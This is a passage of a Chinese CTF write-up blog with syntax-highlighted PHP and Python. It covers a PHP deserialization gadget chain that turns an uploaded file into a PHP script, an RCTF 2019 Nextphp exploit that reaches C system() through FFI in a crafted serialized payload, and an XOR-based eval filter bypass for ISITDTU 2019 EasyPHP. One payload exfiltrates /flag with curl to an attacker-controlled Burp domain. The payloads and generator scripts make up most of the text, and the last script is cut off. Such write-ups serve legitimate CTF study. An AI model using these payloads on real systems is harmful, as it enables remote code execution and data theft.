<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">web</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename_tmp</span>=<span class="string">&quot;./upload/c47b21fcf8f0bc8b3920541abd8024fd/af6f4397ef14747a05a530270c618ce3.png&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;./upload/c47b21fcf8f0bc8b3920541abd8024fd/Boogipop.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$upload_menu</span>=<span class="string">&quot;c47b21fcf8f0bc8b3920541abd8024fd&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$img</span>=<span class="string">&quot;upload_img&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$except</span>=[<span class="string">&quot;index&quot;</span>=&gt;<span class="string">&quot;img&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$registed</span>=<span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$upload</span>=<span class="keyword">new</span> <span class="title class_">Profile</span>();</span><br><span class="line"><span class="variable">$reg</span>=<span class="keyword">new</span> <span class="title class_">Register</span>();</span><br><span class="line"><span class="variable">$reg</span>-&gt;checker=<span class="variable">$upload</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$reg</span>));</span><br></pre></td></tr></table></figure>
<p>理解起来后其实就是很简单的反序列化，代码审计的重要性理解了吧<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673004454113-1368e356-c4c7-4a33-b609-695fe9de0fb4.png" alt="image.png"><br>上号拿flag了</p>
<h2 id="RCTF-2019-Nextphp（PHP7-4FFI）"><a href="#RCTF-2019-Nextphp（PHP7-4FFI）" class="headerlink" title="[RCTF 2019]Nextphp（PHP7.4FFI）"></a>[RCTF 2019]Nextphp（PHP7.4FFI）</h2><p>考点：FFI，反序列化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看到这么简单一瞬间以为是傻逼题，结果你可以试试看ban了很多函数，system之类的全没了<br>输入a&#x3D;phpinfo();<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663397818334-3f306ac9-f683-4424-8f85-677de83a74e7.png" alt="image.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663397823485-cffaa518-d4d1-422a-91a3-e37bc9d67370.png" alt="image.png"><br>可以看到被ban掉的函数有多少，其次注意这是PHP7.4版本，这个版本之后开放了FFI拓展：<br>FFI拓展可以加载不同语言的调用<br><strong>然后再phpinfo中可以看到preload是加载了preload.php文件</strong><br>既然被ban了这么多函数，就用glob协议去读取文件：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663397963801-8cff0fba-5a70-44d6-9eb0-e487c29c666d.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663397953438-927b5adb-3075-4d8d-a608-7f0d643694fa.png" alt="image.png"><br>发现当前目录和根目录有几个文件，当前目录有一个preload.php，而根目录中flag文件就在那儿<br>现在要想办法该如何去读取FLAG,UAF脚本不行，payload长度有限<br>读取preload文件：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$data</span> = [</span><br><span class="line">  <span class="string">&#x27;ret&#x27;</span> =&gt; <span class="literal">null</span>,</span><br><span class="line">  <span class="string">&#x27;func&#x27;</span> =&gt; <span class="string">&#x27;print_r&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;arg&#x27;</span> =&gt; <span class="string">&#x27;1&#x27;</span></span><br><span class="line">  ];</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="variable language_">$this</span>-&gt;data[<span class="string">&#x27;ret&#x27;</span>] = <span class="variable language_">$this</span>-&gt;data[<span class="string">&#x27;func&#x27;</span>](<span class="variable language_">$this</span>-&gt;data[<span class="string">&#x27;arg&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span>(<span class="params"></span>): <span class="title">array</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;data, <span class="variable">$data</span>);</span><br><span class="line">  <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">run</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> (<span class="params"></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$this</span>-&gt;data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span>(<span class="params"><span class="variable">$payload</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable language_">$this</span>-&gt;data = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$payload</span>);</span><br><span class="line">  <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">run</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span> (<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;data[<span class="variable">$key</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span> (<span class="params"><span class="variable">$key</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">\Exception</span>(<span class="string">&#x27;No implemented&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">\Exception</span>(<span class="string">&#x27;No implemented&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这边得用FFI拓展去加载C语言汇总的system函数，因为ban掉了php的system，我们就去使用c语言的。构造本地文件：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$data</span> = [</span><br><span class="line">        <span class="string">&#x27;ret&#x27;</span> =&gt; <span class="literal">null</span>,</span><br><span class="line">        <span class="string">&#x27;func&#x27;</span> =&gt; <span class="string">&#x27;FFI::cdef&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;arg&#x27;</span> =&gt; <span class="string">&#x27;int system(char *command);&#x27;</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//可以进行函数执行</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data[<span class="string">&#x27;ret&#x27;</span>] = <span class="variable language_">$this</span>-&gt;data[<span class="string">&#x27;func&#x27;</span>](<span class="variable language_">$this</span>-&gt;data[<span class="string">&#x27;arg&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> (<span class="params"></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span>(<span class="params"><span class="variable">$payload</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$payload</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">run</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//结果输出</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>
<p>首先说一下，implement和extend是有区别的：</p>
<p>其次是Serializable接口：<br>可以知道接口定义的方法一般是空的，在子类进行重写<br>所以我们假如implement Serializable那我们进行序列化和反序列化都是调用里面的function<br>其实作用一样</p>
<p>还要注意一点，在PHP7.4之后，如果对象实现了 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/class.serializable.php">Serializable</a> 接口，接口的 serialize() 方法会被忽略，做为代替类中的 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.serialize">__serialize()</a> 方法会被调用。<br>所以在本地文件构建时要注释掉这个方法，得到答案：</p>
<blockquote>
<p>C:1:”A”:89:{a:3:{s:3:”ret”;N;s:4:”func”;s:9:”FFI::cdef”;s:3:”arg”;s:26:”int system(char *command);”;}}</p>
</blockquote>
<p>这时如果把payload输入进去，首先会触发__unserialize魔术方法，这就直接调用了run()方法，使得</p>
<blockquote>
<p>data[ret]&#x3D;FFI::cdef(int system(char *command);)</p>
</blockquote>
<p>这样就可以调用c语言中的system函数<br>进而payload：</p>
<blockquote>
<p>C:1:”A”:89:{a:3:{s:3:”ret”;N;s:4:”func”;s:9:”FFI::cdef”;s:3:”arg”;s:26:”int system(char *command);”;}}-&gt;__serialize()[‘ret’]-&gt;system(“curl -F ‘@get&#x3D;&#x2F;flag’ 你的burpsuite域名”)</p>
</blockquote>
<p>这里调用了__serialize来得到ret，也可以用__get魔术方法<br>然后再burpsuite上读取发送过来的包即可</p>
<p>后来又想为什么不直接通过那个 <strong>shell</strong> 利用 <strong>FFI</strong> （直接不用那个反序列化），结果试了发现不行。再次查看文档，发现如下描述：</p>
<blockquote>
<p>FFI API opens all the C power, and consequently, also an enormous possibility to have something go wrong, crash PHP, or even worse. To minimize risk PHP FFI API usage may be restricted. By default FFI API may be used only in CLI scripts and preloaded PHP files. This may be changed through <strong>ffi.enable</strong> INI directive. This is INI_SYSTEM directive and it’s value can’t be changed at run-time.</p>
<ul>
<li><strong>ffi.enable&#x3D;false</strong> completely disables PHP FFI API</li>
<li><strong>ffi.enable&#x3D;true</strong> enables PHP FFI API without any restrictions</li>
<li><strong>ffi.enable&#x3D;preload</strong> (the default value) enables FFI but restrict its usage to CLI and preloaded scripts</li>
</ul>
</blockquote>
<p>原来默认 <strong>ffi.enable&#x3D;preload</strong> 且仅在命令行模式和 <strong>preload</strong> 文件中可用，在本地环境 <strong>ffi.enable&#x3D;preload</strong> 模式下，web端也是无法执行 <strong>FFI</strong> 。将 <strong>ffi.enable</strong> 设置成 <strong>true</strong> 后，发现 <strong>web</strong> 端就可以利用 <strong>FFI</strong> 了。</p>
<p>payload2：</p>
<blockquote>
<p>C:1:”A”:89:{a:3:{s:3:”ret”;N;s:4:”func”;s:9:”FFI::cdef”;s:3:”arg”;s:26:”int system(char *command);”;}}-&gt;__serialize()[‘ret’]-&gt;system(“cp &#x2F;flag 1.txt”)</p>
</blockquote>
<p>然后直接访问1.txt即可。。。</p>
<p>众多参考：</p>
<p>​	</p>
<h2 id="ISITDTU-2019-EasyPHP"><a href="#ISITDTU-2019-EasyPHP" class="headerlink" title="[ISITDTU 2019]EasyPHP"></a>[ISITDTU 2019]EasyPHP</h2><p>考点:命令执行异或的长度限制Bypass</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">	<span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, <span class="variable">$_</span>) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;rosé will not do it&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">count_chars</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$_</span>), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;you are so close, omg&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>首先先做一个fuzz</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span>=[];</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">128</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (! <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)) )&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$arr</span>,<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$arr</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!-- </span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; !</span><br><span class="line">    [<span class="number">1</span>] =&gt; #</span><br><span class="line">    [<span class="number">2</span>] =&gt; %</span><br><span class="line">    [<span class="number">3</span>] =&gt; (</span><br><span class="line">    [<span class="number">4</span>] =&gt; )</span><br><span class="line">    [<span class="number">5</span>] =&gt; *</span><br><span class="line">    [<span class="number">6</span>] =&gt; +</span><br><span class="line">    [<span class="number">7</span>] =&gt; -</span><br><span class="line">    [<span class="number">8</span>] =&gt; /</span><br><span class="line">    [<span class="number">9</span>] =&gt; :</span><br><span class="line">    [<span class="number">10</span>] =&gt; ;</span><br><span class="line">    [<span class="number">11</span>] =&gt; &lt;</span><br><span class="line">    [<span class="number">12</span>] =&gt; =</span><br><span class="line">    [<span class="number">13</span>] =&gt; &gt;</span><br><span class="line">    [<span class="number">14</span>] =&gt; ?</span><br><span class="line">    [<span class="number">15</span>] =&gt; @</span><br><span class="line">    [<span class="number">16</span>] =&gt; A</span><br><span class="line">    [<span class="number">17</span>] =&gt; B</span><br><span class="line">    [<span class="number">18</span>] =&gt; C</span><br><span class="line">    [<span class="number">19</span>] =&gt; H</span><br><span class="line">    [<span class="number">20</span>] =&gt; I</span><br><span class="line">    [<span class="number">21</span>] =&gt; J</span><br><span class="line">    [<span class="number">22</span>] =&gt; K</span><br><span class="line">    [<span class="number">23</span>] =&gt; L</span><br><span class="line">    [<span class="number">24</span>] =&gt; M</span><br><span class="line">    [<span class="number">25</span>] =&gt; N</span><br><span class="line">    [<span class="number">26</span>] =&gt; Q</span><br><span class="line">    [<span class="number">27</span>] =&gt; R</span><br><span class="line">    [<span class="number">28</span>] =&gt; T</span><br><span class="line">    [<span class="number">29</span>] =&gt; U</span><br><span class="line">    [<span class="number">30</span>] =&gt; V</span><br><span class="line">    [<span class="number">31</span>] =&gt; W</span><br><span class="line">    [<span class="number">32</span>] =&gt; X</span><br><span class="line">    [<span class="number">33</span>] =&gt; Y</span><br><span class="line">    [<span class="number">34</span>] =&gt; Z</span><br><span class="line">    [<span class="number">35</span>] =&gt; \</span><br><span class="line">    [<span class="number">36</span>] =&gt; ]</span><br><span class="line">    [<span class="number">37</span>] =&gt; ^</span><br><span class="line">    [<span class="number">38</span>] =&gt; a</span><br><span class="line">    [<span class="number">39</span>] =&gt; b</span><br><span class="line">    [<span class="number">40</span>] =&gt; c</span><br><span class="line">    [<span class="number">41</span>] =&gt; h</span><br><span class="line">    [<span class="number">42</span>] =&gt; i</span><br><span class="line">    [<span class="number">43</span>] =&gt; j</span><br><span class="line">    [<span class="number">44</span>] =&gt; k</span><br><span class="line">    [<span class="number">45</span>] =&gt; l</span><br><span class="line">    [<span class="number">46</span>] =&gt; m</span><br><span class="line">    [<span class="number">47</span>] =&gt; n</span><br><span class="line">    [<span class="number">48</span>] =&gt; q</span><br><span class="line">    [<span class="number">49</span>] =&gt; r</span><br><span class="line">    [<span class="number">50</span>] =&gt; t</span><br><span class="line">    [<span class="number">51</span>] =&gt; u</span><br><span class="line">    [<span class="number">52</span>] =&gt; v</span><br><span class="line">    [<span class="number">53</span>] =&gt; w</span><br><span class="line">    [<span class="number">54</span>] =&gt; x</span><br><span class="line">    [<span class="number">55</span>] =&gt; y</span><br><span class="line">    [<span class="number">56</span>] =&gt; z</span><br><span class="line">    [<span class="number">57</span>] =&gt; &#125;</span><br><span class="line">    [<span class="number">58</span>] =&gt; ~</span><br><span class="line">)</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
<p>字母几乎都没ban，数字全没了，这题的难点不是这个fuzz而是<br><code>strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd</code><br>这句话限制死了我们payload中字符串种类最多为13,我们考虑使用异或<br>除去一些必要的<code>();^</code>，就剩下9种<br>因此现在要做的就是缩短payload中字符串种类，写脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">result2 = [<span class="number">160</span>, <span class="number">136</span>, <span class="number">138</span>, <span class="number">140</span>, <span class="number">141</span>, <span class="number">144</span>, <span class="number">145</span>, <span class="number">209</span>, <span class="number">150</span>, <span class="number">151</span>, <span class="number">154</span>, <span class="number">155</span>, <span class="number">156</span>, <span class="number">158</span>]  <span class="comment"># Original chars,14 total</span></span><br><span class="line">result = [<span class="number">160</span>, <span class="number">136</span>, <span class="number">141</span>, <span class="number">209</span>, <span class="number">151</span>, <span class="number">154</span>, <span class="number">155</span>, <span class="number">156</span>]</span><br><span class="line"><span class="comment"># temp = []</span></span><br><span class="line"><span class="comment"># for d in result2:</span></span><br><span class="line"><span class="comment">#     for a in result:</span></span><br><span class="line"><span class="comment">#         for b in result:</span></span><br><span class="line"><span class="comment">#             for c in result:</span></span><br><span class="line"><span class="comment">#                 if (a ^ b ^ c == d):</span></span><br><span class="line"><span class="comment">#                     if a == b == c == d:</span></span><br><span class="line"><span class="comment">#                         continue</span></span><br><span class="line"><span class="comment">#                     else:</span></span><br><span class="line"><span class="comment">#                         # print(&quot;a=0x%x,b=0x%x,c=0x%x,d=0x%x&quot; % (a, b, c, d))</span></span><br><span class="line"><span class="comment">#                         if d not in temp:</span></span><br><span class="line"><span class="comment">#                             temp.append(d)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">string</span>):</span><br><span class="line">    result=[]</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> string:</span><br><span class="line">        <span class="built_in">ascii</span>=<span class="built_in">ord</span>(s)</span><br><span class="line">        res=<span class="built_in">ascii</span>^<span class="number">0xff</span></span><br><span class="line">        <span class="comment"># result+=&quot;%&quot;+str(hex(res1)).replace(&quot;0x&quot;,&quot;&quot;)</span></span><br><span class="line">        result.append(res)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Replace</span>(<span class="params">hexlist</span>):</span><br><span class="line">    flag=<span class="literal">False</span></span><br><span class="line">    res1=[]</span><br><span class="line">    res2=[]</span><br><span class="line">    res3=[]</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> hexlist:</span><br><span class="line">        flag = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> result:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> result:</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> result:</span><br><span class="line">                    <span class="comment">#result2用于获取show_source</span></span><br><span class="line">                    xor=b^c^d</span><br><span class="line">                    <span class="keyword">if</span>(xor==a):</span><br><span class="line">                        <span class="keyword">if</span> a == b == c == d:</span><br><span class="line">                            <span class="keyword">continue</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">if</span> flag:</span><br><span class="line">                                <span class="keyword">break</span></span><br><span class="line">                            flag=<span class="literal">True</span></span><br><span class="line">                            res1.append(b)</span><br><span class="line">                            res2.append(c)</span><br><span class="line">                            res3.append(d)</span><br><span class="line">                    <span class="keyword">if</span> flag:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> flag:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> flag:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    out=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> string <span class="keyword">in</span> res1:</span><br><span class="line">        out+=<span 